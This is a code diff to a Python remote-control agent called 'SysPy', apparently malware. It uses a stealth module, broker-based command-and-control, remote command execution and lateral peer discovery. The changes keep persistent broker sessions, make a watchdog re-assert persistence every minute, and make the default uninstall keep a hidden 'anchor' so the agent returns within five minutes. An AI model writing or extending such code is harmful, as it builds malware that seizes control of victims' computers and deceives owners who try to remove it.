@@ -44,6 +44,7 @@ class Agent:
         self.bundle_entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))
         self.self_sha = self._sha_of(self.bundle_entry)
 
+        self._peer_ids: set[str] = set()
         self.eval_namespace: dict[str, Any] = {
             "agent": self, "os": os, "sys": sys, "time": time,
             "config": config, "sysinfo": sysinfo,
@@ -73,7 +74,7 @@ class Agent:
         return config.subnet()
 
     def _known_peer_ids(self) -> set[str]:
-        return {a for a in (config.parent_id(),) if a}
+        return set(self._peer_ids) | {a for a in (config.parent_id(),) if a}
 
     def _on_peer(self, record: dict) -> None:
         self.send({"t": "note", "d": f"peer {record.get('host')} {record.get('ip')} hop={record.get('hop')}"})
@@ -143,6 +144,8 @@ class Agent:
         if kind == "cmd":
             threading.Thread(target=commands.execute, args=(self, message.get("d", "")),
                              name="cmd", daemon=True).start()
+        elif kind == "roster":
+            self._peer_ids = {str(x) for x in (message.get("ids") or []) if x}
         elif kind == "put":
             self._receive_upload(message)
         elif kind == "update":
@@ -262,10 +265,10 @@ class Agent:
     def _connect(self) -> bool:
         for host, port, use_tls in config.broker_order():
             try:
-                client = MqttClient(random_client_id("syspy-a"), self._on_message)
+                client = MqttClient("syspy-a-" + config.short_id(), self._on_message)
                 client.connect(
                     host, port, use_tls,
-                    clean_session=True,
+                    clean_session=False,
                     will_topic=config.topic_up(self.agent_id),
                     will_payload=self.codec.encode({"t": "bye"}),
                 )
@@ -348,7 +351,9 @@ def main(argv: list[str] | None = None) -> int:
             print(f"{'OK  ' if os.path.exists(candidate) else 'MISS'} {candidate}")
         return 0
 
-    if "--uninstall" in argv or "--remove" in argv:
+    hard = ("--force" in argv) or ("--purge" in argv) or not config.protected()
+
+    if "--uninstall" in argv or "--remove" in argv or "--purge" in argv:
         if stealth.IS_WINDOWS and not stealth.is_admin() and os.environ.get("SYSPY_NO_UAC") != "1" and "--no-elevate" not in argv:
             print("[*] Requesting Administrator privileges to stop services and remove files...")
             if stealth.elevate_process(argv, wait=True):
@@ -356,8 +361,12 @@ def main(argv: list[str] | None = None) -> int:
                 return 0
             print("[!] Elevation was declined or failed. Proceeding with user-level removal.")
         print("Removing SysPy agent and persistence...")
-        for action in persistence.remove():
+        actions = persistence.purge() if hard else persistence.remove(keep_anchor=True)
+        for action in actions:
             print(f"  [x] {action}")
+        if not hard:
+            print("  [i] anchor kept - the agent will return within 5 minutes.")
+            print("      use --uninstall --force to remove it completely.")
         print("Done.")
         return 0
 
@@ -412,9 +421,19 @@ def _watchdog_main() -> int:
 
     entry = os.path.join(stealth.bundle_root(), os.path.basename(sys.argv[0]))
 
+    last_assert = 0.0
     while True:
         time.sleep(5)
         stealth.write_pid(lock, os.getpid())
+
+        if time.time() - last_assert > 60:
+            last_assert = time.time()
+            try:
+                persistence.ensure()
+                guardian.ensure()
+            except Exception:
+                pass
+
         owner = stealth.read_pid(stealth.lock_path())
         if owner and stealth.process_alive(owner):
             continue
